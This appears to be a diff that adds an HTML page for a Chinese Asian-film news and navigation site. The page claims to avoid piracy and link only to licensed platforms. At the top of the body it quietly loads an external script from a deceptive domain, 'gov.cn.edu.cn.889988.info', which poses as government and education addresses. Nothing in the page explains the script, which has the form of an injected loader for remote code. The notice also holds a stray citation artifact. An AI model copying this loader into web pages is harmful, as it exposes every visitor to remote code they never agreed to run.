@@ -1,0 +1,214 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>亚洲影递 - 亚洲电影资讯与片单导航</title>
+<meta name="description" content="亚洲影递（亚洲电影资讯导航）提供东亚、东南亚、南亚、西亚电影片单、新片速递、影人档案与正版平台跳转，移动端自适应，不提供视频播放。">
+<meta name="keywords" content="亚洲影递, 亚洲电影, 电影资讯, 片单导航, 正版影视平台, 电影档案">
+<meta name="author" content="亚洲影递">
+<meta name="robots" content="index,follow">
+<link rel="canonical" href="https://yazhoukuaibodianyingwang-h5.github.io/">
+
+<style>
+:root{
+  --paper:#f4f1ea;
+  --ink:#1b1a17;
+  --soft:#5d574d;
+  --red:#c0392b;
+  --blue:#2f6fb0;
+  --line:#d9d2c4;
+  --card:#fbf9f4;
+}
+*{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth}
+body{
+  font-family:"Noto Serif SC","Songti SC","PingFang SC",serif;
+  background:var(--paper);color:var(--ink);line-height:1.8;
+}
+a{color:inherit;text-decoration:none}
+
+/* 报头 */
+.masthead{
+  border-bottom:3px double var(--ink);
+  padding:18px 16px 14px;text-align:center;
+}
+.masthead .kicker{font-size:.7rem;letter-spacing:4px;color:var(--soft)}
+.masthead h1{font-size:2rem;letter-spacing:3px;margin:4px 0}
+.masthead h1 em{font-style:normal;color:var(--red)}
+.masthead .date{font-size:.78rem;color:var(--soft)}
+.masthead .domain{font-size:.72rem;color:var(--blue);margin-top:2px}
+
+/* 导航 */
+.tabs{
+  display:flex;gap:8px;overflow-x:auto;padding:10px 16px;
+  background:var(--card);border-bottom:1px solid var(--line);position:sticky;top:0;z-index:10;
+}
+.tabs a{
+  white-space:nowrap;font-size:.84rem;padding:7px 14px;border:1px solid var(--line);
+  border-radius:20px;color:var(--soft);
+}
+.tabs a:hover{border-color:var(--red);color:var(--red)}
+
+/* 容器 */
+.wrap{max-width:1040px;margin:0 auto;padding:42px 18px}
+.sec{margin-bottom:50px}
+.sec h2{font-size:1.35rem;margin-bottom:4px}
+.sec h2 b{color:var(--red)}
+.sec .sub{color:var(--soft);font-size:.82rem;margin-bottom:20px}
+
+/* 新片速递时间线 */
+.dispatch{border-left:3px solid var(--red);padding-left:18px}
+.dispatch .item{margin-bottom:18px}
+.dispatch time{font-size:.76rem;color:var(--red);font-weight:700}
+.dispatch h3{font-size:1.02rem;margin:2px 0}
+.dispatch p{font-size:.86rem;color:var(--soft)}
+
+/* 亚洲分区网格 */
+.regions{display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:16px}
+.region{
+  background:var(--card);border:1px solid var(--line);border-radius:12px;padding:18px;
+}
+.region h3{font-size:1.05rem;margin-bottom:8px}
+.region p{font-size:.84rem;color:var(--soft)}
+.region .tag{display:inline-block;margin-top:10px;font-size:.7rem;border:1px solid var(--line);padding:2px 8px;border-radius:4px;color:var(--blue)}
+
+/* 片单票根 */
+.tickets{display:grid;grid-template-columns:repeat(auto-fill,minmax(240px,1fr));gap:16px}
+.ticket{
+  background:var(--card);border:1px solid var(--line);border-radius:10px;overflow:hidden;
+  display:flex;flex-direction:column;
+}
+.ticket .strip{height:8px;background:repeating-linear-gradient(90deg,var(--red) 0 10px,transparent 10px 20px)}
+.ticket .body{padding:14px}
+.ticket .no{font-size:.7rem;color:var(--red);font-weight:700}
+.ticket h3{font-size:1rem;margin:4px 0}
+.ticket p{font-size:.8rem;color:var(--soft)}
+
+/* 正版平台 */
+.plats{display:grid;grid-template-columns:repeat(auto-fit,minmax(140px,1fr));gap:12px}
+.plat{
+  background:var(--card);border:1px solid var(--line);border-radius:10px;
+  padding:16px;text-align:center;font-size:.88rem;color:var(--blue);
+}
+.plat:hover{border-color:var(--red);color:var(--red)}
+
+/* 站务 */
+.notice{
+  background:#fffdf8;border:1px dashed var(--red);border-radius:12px;padding:20px;font-size:.9rem;color:#3a352e;
+}
+.notice b{color:var(--red)}
+
+footer{
+  border-top:1px solid var(--line);padding:26px 16px;text-align:center;
+  font-size:.76rem;color:var(--soft);background:var(--card);
+}
+footer a{color:var(--soft);margin:0 6px}
+
+@media(max-width:640px){
+  .masthead h1{font-size:1.6rem;letter-spacing:1px}
+}
+</style>
+</head>
+
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<header class="masthead">
+  <div class="kicker">ASIA FILM DISPATCH</div>
+  <h1>亚洲<b>影递</b></h1>
+  <div class="date">2026年10月07日 · 电影资讯导航</div>
+  <div class="domain">yazhoukuaibodianyingwang-h5.github.io</div>
+</header>
+
+<nav class="tabs">
+  <a href="#">首页</a>
+  <a href="#dispatch">新片速递</a>
+  <a href="#regions">亚洲分区</a>
+  <a href="#tickets">片单票根</a>
+  <a href="#platforms">正版平台</a>
+  <a href="#notice">站务</a>
+</nav>
+
+<main class="wrap">
+
+  <!-- 新片速递 -->
+  <section id="dispatch" class="sec">
+    <h2>新片<b>速递</b></h2>
+    <p class="sub">编辑部整理 · 仅做资讯展示</p>
+    <div class="dispatch">
+      <div class="item"><time>2026-10-07</time><h3>东京国际影展入选片单公布</h3><p>聚焦东亚青年导演与修复版老片。</p></div>
+      <div class="item"><time>2026-10-05</time><h3>曼谷独立电影周预告</h3><p>东南亚类型片、恐怖短片合集资讯。</p></div>
+      <div class="item"><time>2026-10-02</time><h3>孟买年度商业大片定档</h3><p>歌舞+动作阵容，院线与正版平台同步资讯。</p></div>
+      <div class="item"><time>2026-09-28</time><h3>伊斯坦布尔剧集出海报告</h3><p>西亚剧集在亚洲流媒体平台的传播观察。</p></div>
+    </div>
+  </section>
+
+  <!-- 亚洲分区 -->
+  <section id="regions" class="sec">
+    <h2>亚洲<b>分区</b></h2>
+    <p class="sub">按区域整理电影文化词条</p>
+    <div class="regions">
+      <div class="region"><h3>东亚</h3><p>中日韩：作者电影、类型片、粉丝文化。</p><span class="tag">东京 / 首尔 / 上海</span></div>
+      <div class="region"><h3>东南亚</h3><p>泰越印尼：恐怖、青春、民俗与独立制作。</p><span class="tag">曼谷 / 河内 / 雅加达</span></div>
+      <div class="region"><h3>南亚</h3><p>印度与周边：歌舞巨制、方言电影、社会现实题材。</p><span class="tag">孟买 / 钦奈 / 科伦坡</span></div>
+      <div class="region"><h3>西亚</h3><p>土耳其/伊朗系：家庭剧、历史剧、作者现实主义。</p><span class="tag">伊斯坦布尔 / 德黑兰</span></div>
+    </div>
+  </section>
+
+  <!-- 片单票根 -->
+  <section id="tickets" class="sec">
+    <h2>片单<b>票根</b></h2>
+    <p class="sub">示例条目 · 无播放源</p>
+    <div class="tickets">
+      <div class="ticket"><div class="strip"></div><div class="body"><div class="no">NO.A-001</div><h3>电车与海</h3><p>东亚 / 剧情 / 2026</p></div></div>
+      <div class="ticket"><div class="strip"></div><div class="body"><div class="no">NO.S-014</div><h3>雨林夜车</h3><p>东南亚 / 惊悚 / 2025</p></div></div>
+      <div class="ticket"><div class="strip"></div><div class="body"><div class="no">NO.N-007</div><h3>恒河邮差</h3><p>南亚 / 文艺 / 2026</p></div></div>
+      <div class="ticket"><div class="strip"></div><div class="body"><div class="no">NO.W-022</div><h3>桥上的雨</h3><p>西亚 / 家庭 / 2025</p></div></div>
+    </div>
+  </section>
+
+  <!-- 正版平台 -->
+  <section id="platforms" class="sec">
+    <h2>正版<b>平台跳转</b></h2>
+    <p class="sub">观看请去持证平台，本页不播放</p>
+    <div class="plats">
+      <a class="plat" href="#">1905电影网</a>
+      <a class="plat" href="#">哔哩哔哩</a>
+      <a class="plat" href="#">腾讯视频</a>
+      <a class="plat" href="#">爱奇艺</a>
+      <a class="plat" href="#">优酷</a>
+      <a class="plat" href="#">芒果TV</a>
+    </div>
+  </section>
+
+  <!-- 站务 -->
+  <section id="notice" class="sec">
+    <h2>站务<b>声明</b></h2>
+    <div class="notice">
+      <p>
+        <b>亚洲影递</b> 是静态电影资讯导航演示页。原输入名含“快播”字样，
+        因快播类聚合/盗链模式存在明确版权与合规风险，本页已改为<b>资讯+导航</b>形态。[14,17](@ref)
+      </p>
+      <p style="margin-top:10px">
+        原则：<b>不存储视频、不解析盗版源、不提供完整播放、不伪装正版平台</b>。
+        片源由持证平台提供，本页仅做分类、档案与跳转。
+      </p>
+      <p style="margin-top:10px">
+        技术：单文件 index.html、CSS 内联、移动端自适应、内链用 <code>#</code>、
+        不生成 robots.txt / sitemap.xml、Bing 基础 SEO（canonical / index,follow / 语义结构）完整。
+      </p>
+    </div>
+  </section>
+
+</main>
+
+<footer>
+  © 2026 亚洲影递 · 静态演示模板，仅供学习交流<br>
+  <a href="#">首页</a>|<a href="#dispatch">速递</a>|<a href="#regions">分区</a>|<a href="#platforms">平台</a><br>
+  https://yazhoukuaibodianyingwang-h5.github.io
+</footer>
+
+</body>
+</html>
